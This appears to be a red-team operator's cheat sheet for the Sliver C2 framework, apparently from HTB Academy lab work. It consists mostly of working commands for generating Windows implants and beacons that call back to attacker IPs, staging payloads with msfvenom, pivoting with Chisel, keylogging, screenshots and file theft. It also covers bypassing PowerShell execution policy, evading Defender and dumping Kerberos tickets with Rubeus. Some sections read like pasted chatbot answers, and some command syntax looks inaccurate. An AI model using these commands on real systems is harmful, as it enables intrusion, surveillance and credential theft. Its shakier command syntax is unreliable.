
### Server initialization examples
- start server on kali
```bash
sliver-server
```
- generate a beacon
```shell-session
generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save <directory>
```
- generate an implant
```shell-session
generate --http 10.10.16.14:8088 --skip-symbols --os windows --arch amd64 --format exe --save <directory>
```
- start listeners
```shell-session
http -L 10.10.16.14 -l 8088 --website delivery
```
```shell-session
http -L 10.10.16.14 -l 9001
```

Need to transfer the implant, beacon, or both to the victim machine and execute the payloads to receive a connection back to the sliver server instance.

#### Making a mistake in the ip address for a implant of some kind and how to regenerate it

- use command `implants` to list all the generated implants
- `implants rm <implant name>` will delete the implant from the list
- regenerate the implant as shown below:
```shell-session
[server] sliver > generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save /home/roger/Documents/HTB/Academy/Sliver/Pivoting

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[!] rpc error: code = Unknown desc = UNIQUE constraint failed: implant_builds.name

[server] sliver > implants

 Name                Implant Type   Template   OS/Arch             Format   Command & Control              Debug 
=================== ============== ========== =============== ============ ============================== =======
 ACCEPTED_SNOWPLOW   session        sliver     windows/amd64   EXECUTABLE   [1] https://10.10.16.14        false 
 BOLD_WHIP           session        sliver     windows/amd64   EXECUTABLE   [1] https://10.10.16.14:8088   false 
 http-beacon-9001    beacon         sliver     windows/amd64   EXECUTABLE   [1] https://10.10.14.62:9001   false 

[server] sliver > help implants

List implant builds

Usage:
======
  implants [flags]

Flags:
======
  -a, --arch          string    filter builds by cpu architecture
  -f, --format        string    filter builds by artifact format
  -h, --help                    display help
  -d, --no-debug                filter builds by debug flag
  -b, --only-beacons            filter beacons
  -s, --only-sessions           filter interactive sessions
  -o, --os            string    filter builds by operating system
  -t, --timeout       int       command timeout in seconds (default: 60)

Sub Commands:
=============
  rm  Remove implant build

[server] sliver > implants rm http-beacon-9001

? Remove 'http-beacon-9001' build? Yes

[server] sliver > generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save /home/roger/Documents/HTB/Academy/Sliver/Pivoting

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/roger/Documents/HTB/Academy/Sliver/Pivoting/http-beacon-9001.exe

```

### Pivoting using Chisel

- make sure proxychains.conf is configured for socks5 port 9050
- start chisel server on attack box outside of sliver
```bash
./chisel_1.8.1_linux_arm64 server --reverse -p 1337 -v --socks5
```
- send chisel command to beacon
```shell-session
chisel client 10.10.16.14:1337 R:socks
```
- wait for the beacon to execute the connection
```bash
 ./chisel_1.8.1_linux_arm64 server --reverse -p 1337 -v --socks5
2024/06/19 16:06:41 server: Reverse tunnelling enabled
2024/06/19 16:06:41 server: Fingerprint agCO4/5IHu/zX9sZcA81hln7RTIHGtFsTZIugte3jh0=
2024/06/19 16:06:41 server: Listening on http://0.0.0.0:1337
2024/06/19 16:08:09 server: session#1: Handshaking with 10.129.205.234:49898...
2024/06/19 16:08:10 server: session#1: Verifying configuration
2024/06/19 16:08:10 server: session#1: Client version (v1.8.1) differs from server version (1.8.1)
2024/06/19 16:08:10 server: session#1: tun: Created (SOCKS enabled)
2024/06/19 16:08:10 server: session#1: tun: SSH connected
2024/06/19 16:08:10 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/06/19 16:08:10 server: session#1: tun: Bound proxies

```
- need to start socks5 on sliver-server
```shell-session
socks5 start -P 9050
```

## Stagers

1. Start payload listener
```bash
mtls -l 9001
```

2. Configure profile(s)
```bash
profiles new --mtls <ip>:9001 -l -f shellcode <profile name>
profiles new beacon --http http://<ip>:<port> -f shellcode <profile name>
```

3. Create staged listener
```bash
stage-listener -u http://<ip>:<port not 9001> -p <profile name>
stage-listener -u tcp://<ip>:<new port> -p <profile name>
```
4. Create stage with `msfvenom`
```bash
msfvenom -p windows/x64/custom/reverse_<tcp|winhttp|...> lhost=<ip or device name> lport=<port>
```
	*Note:* for `winhttp` payloads `LURI=what.woff` needs to be included
5. Custom stager (example code can be found here: https://sliver.sh/docs?name=Stagers)
	1. *Note:* to evade Defender, change the text `Sliver-stager, Stager, shellcode, and DownloadAndExecute`
## Command Examples:

The Sliver C2 framework is a powerful and flexible post-exploitation command and control tool. Here is a list of common commands you can use with Sliver for generating payloads and performing post-exploitation activities. Note that the exact commands may vary depending on the version of Sliver you are using. For the most up-to-date information, consult the official Sliver documentation or use the help commands within the Sliver console.

### Payload Generation Commands

1. **Generate an HTTP payload**:
   ```bash
   generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

2. **Generate an HTTPS payload**:
   ```bash
   generate --https --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

3. **Generate a DNS payload**:
   ```bash
   generate --dns --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

4. **Generate a TCP payload**:
   ```bash
   generate --tcp --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

5. **Generate a stageless payload**:
   ```bash
   generate --stageless --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

6. **Generate a payload for a specific platform**:
   ```bash
   generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME> --platform <PLATFORM>
   ```

### Shellcode Generation Example

```shell
generate stager --lhost 192.168.45.250 --lport 9001 --arch amd64 --format c --save ~/test.c
```

### Post-Exploitation Commands

1. **List active sessions**:
   ```bash
   sessions
   ```

2. **Interact with a session**:
   ```bash
   use <SESSION_ID>
   ```

3. **Execute a command on the target system**:
   ```bash
   shell <COMMAND>
   ```

4. **Upload a file to the target system**:
   ```bash
   upload <LOCAL_FILE> <REMOTE_PATH>
   ```

5. **Download a file from the target system**:
   ```bash
   download <REMOTE_FILE> <LOCAL_PATH>
   ```

6. **List files in a directory on the target system**:
   ```bash
   ls <REMOTE_DIRECTORY>
   ```

7. **Change directory on the target system**:
   ```bash
   cd <REMOTE_DIRECTORY>
   ```

8. **Capture a screenshot from the target system**:
   ```bash
   screenshot
   ```

9. **Record keystrokes on the target system**:
   ```bash
   keylogger start
   ```

10. **Stop recording keystrokes on the target system**:
    ```bash
    keylogger stop
    ```

11. **Retrieve recorded keystrokes**:
    ```bash
    keylogger dump
    ```

12. **List processes running on the target system**:
    ```bash
    ps
    ```

13. **Kill a process on the target system**:
    ```bash
    kill <PROCESS_ID>
    ```

14. **Migrate the implant to another process**:
    ```bash
    migrate <PROCESS_ID>
    ```

15. **Run a built-in command (e.g., port scan, file search)**:
    ```bash
    run <COMMAND>
    ```

16. **Execute a script on the target system**:
    ```bash
    execute <SCRIPT_PATH>
    ```

17. **Spawn a new shell on the target system**:
    ```bash
    spawn <SHELL_TYPE>
    ```

18. **Check the implant's status and configuration**:
    ```bash
    status
    ```

### Example Workflow

1. **Generate a payload**:
   ```bash
   generate --https --host 192.168.1.10 --port 443 --save payload.exe
   ```

2. **Launch the payload on the target system** (e.g., by using social engineering or a vulnerability).

3. **List active sessions**:
   ```bash
   sessions
   ```

4. **Interact with the active session**:
   ```bash
   use 1
   ```

5. **Perform post-exploitation activities** (e.g., uploading/downloading files, executing commands):
   ```bash
   whoami
   upload C:\local\file.txt C:\remote\file.txt
   download C:\remote\file.txt C:\local\file.txt
   ```

### Useful Built-in Commands

1. **Port scan**:
   ```bash
   run portscan <TARGET_IP> <PORT_RANGE>
   ```

2. **Search for files**:
   ```bash
   run search -d <DIRECTORY> -p <PATTERN>
   ```

3. **Gather system information**:
   ```bash
   run sysinfo
   ```

4. **Gather network information**:
   ```bash
   run netinfo
   ```

These commands provide a good starting point for using the Sliver C2 framework for both payload generation and post-exploitation activities. Always refer to the official Sliver documentation for the most accurate and comprehensive information.

Yes, you can run a PowerShell script from Sliver, a popular C2 framework used in red teaming operations. Sliver allows operators to execute commands and scripts on compromised systems, including PowerShell scripts, through its implants.

### Methods to Run a PowerShell Script from Sliver

1. **Using the `shell` Command**:
   The simplest way to run a PowerShell script from Sliver is by using the `shell` command. This command allows you to execute any command as if you were in a command prompt on the compromised system.

   ```plaintext
   shell powershell -ExecutionPolicy Bypass -File "C:\path\to\your\script.ps1"
   ```

   This command tells PowerShell to run the specified script with the `-ExecutionPolicy Bypass` flag to avoid policy restrictions.

2. **Inline PowerShell with `shell`**:
   You can also run inline PowerShell commands directly from the Sliver implant without using a script file. This is useful for quick commands or one-liners:

   ```plaintext
   shell powershell -ExecutionPolicy Bypass -Command "Get-Process"
   ```

3. **Using the `powershell` Command**:
   Sliver has a dedicated `powershell` command that allows you to execute PowerShell scripts and commands more seamlessly. You can paste your entire script directly into the Sliver console:

   ```plaintext
   powershell <command-or-script>
   ```

   For example:

   ```plaintext
   powershell Get-Process | Out-File C:\path\to\output.txt
   ```

4. **Using the `execute-assembly` Command**:
   If your PowerShell script is compiled into an executable or a .NET assembly, you can use the `execute-assembly` command to run it:

   ```plaintext
   execute-assembly C:\path\to\your\compiled.exe
   ```

5. **Using Encoded Commands**:
   If you need to obfuscate your PowerShell script or avoid certain detection mechanisms, you can use the `-EncodedCommand` parameter. You first need to encode your PowerShell script in Base64:

   ```plaintext
   powershell -EncodedCommand <Base64-encoded-script>
   ```

   To encode a PowerShell script:

   ```powershell
   $command = "Get-Process"
   $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
   $encodedCommand = [Convert]::ToBase64String($bytes)
   Write-Output $encodedCommand
   ```

   You can then run this encoded command from Sliver:

   ```plaintext
   shell powershell -EncodedCommand <Base64-encoded-script>
   ```

### Considerations
- **Execution Policy**: Use `-ExecutionPolicy Bypass` to ensure that your script runs even if the system has restrictive policies.
- **AV/EDR Evasion**: Running PowerShell scripts may trigger antivirus (AV) or endpoint detection and response (EDR) solutions. Consider obfuscating your script or using techniques like AMSI bypass if necessary.
- **Operational Security**: Running PowerShell scripts can be noisy and may attract attention from security monitoring systems. Always consider the potential risk of detection.

### Example of Running a PowerShell Script
Here’s a complete example of running a PowerShell script to dump processes to a file:

```plaintext
shell powershell -ExecutionPolicy Bypass -Command "Get-Process | Out-File C:\Windows\Temp\processes.txt"
```

This command dumps a list of all running processes to `C:\Windows\Temp\processes.txt`.

### Conclusion
Running PowerShell scripts from Sliver is straightforward and can be done using the `shell`, `powershell`, or `execute-assembly` commands. Depending on your specific operational needs, you can choose the method that best suits your scenario. However, always ensure that you're operating within legal and ethical boundaries, particularly when testing or simulating attacks.

To use the Sliver C2 framework to create a tunnel that proxies an RDP session, you’ll need to follow these general steps:

### **1. Setup Sliver C2 Framework**
   - **Install Sliver:** 
     - Download and install the Sliver C2 framework on your attack machine. You can get it from the official [Sliver GitHub repository](https://github.com/BishopFox/sliver).
     - Run the Sliver server by executing `sliver-server` in your terminal.

### **2. Generate a Sliver Implant**
   - **Create the Implant:**
     - Generate a new implant (payload) that will be executed on the target system.
     - Use a command like:
       ```bash
       generate --mtls --save /path/to/save/implant.exe
       ```
     - Options like `--mtls` specify the type of communication (e.g., mutual TLS).

### **3. Deploy the Implant on the Target System**
   - **Deploy the Payload:**
     - Transfer the generated implant to the target machine.
     - Execute the implant on the target machine to establish a connection back to the Sliver server.

### **4. Establish a Tunnel in Sliver**
   - **Start a Session:**
     - Once the implant connects back, you will see it in the `sessions` list.
     - Interact with the session by using:
       ```bash
       sessions
       use <session_id>
       ```
   - **Create a Tunnel:**
     - Set up a tunnel that forwards traffic to your target’s RDP port.
     - Use the `tunnel` command:
       ```bash
       tunnel add --local 127.0.0.1:3389 --remote 127.0.0.1:3389
       ```
     - This command sets up a tunnel where traffic on your local machine’s port `3389` (RDP) is forwarded to the target’s RDP port.

### **5. Proxy the RDP Session**
   - **Connect via RDP:**
     - Open your RDP client on your local machine.
     - Connect to `127.0.0.1:3389`, which will now proxy the connection to the target machine's RDP service via the tunnel you established.

### **6. Monitor and Manage the Tunnel**
   - **View Tunnels:**
     - Use `tunnel list` to view active tunnels.
   - **Remove Tunnel:**
     - If you need to remove a tunnel, use:
       ```bash
       tunnel del <tunnel_id>
       ```

### **Important Considerations:**
   - **Firewall/NAT Evasion:** Reverse tunneling (via the implant) helps bypass NAT/firewalls, allowing you to connect to services like RDP even if the target is behind a firewall or NAT.
   - **Security Measures:** Ensure you have the appropriate authorization to perform these actions, as tunneling into a system without permission is illegal and unethical.

This setup enables you to proxy an RDP session through Sliver, allowing remote access and control of the target system via the RDP protocol.


### Rubeus and getting a TGT

```bash
Rebueus dump /service:krbtgt /nowrap
```

- Copy b64 ticket to a file
- Convert b64 to .kirbi
```bash
base64 -d ticket.b64 > ticket.kirbi
```
- Convert to ccache format
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```
- export ticket
```bash
export KRB5CCNAME=<path to ticket.ccache>
```

*Alternate way:*
```bash
impacket-getTGT <domain>/<user>:<password>
```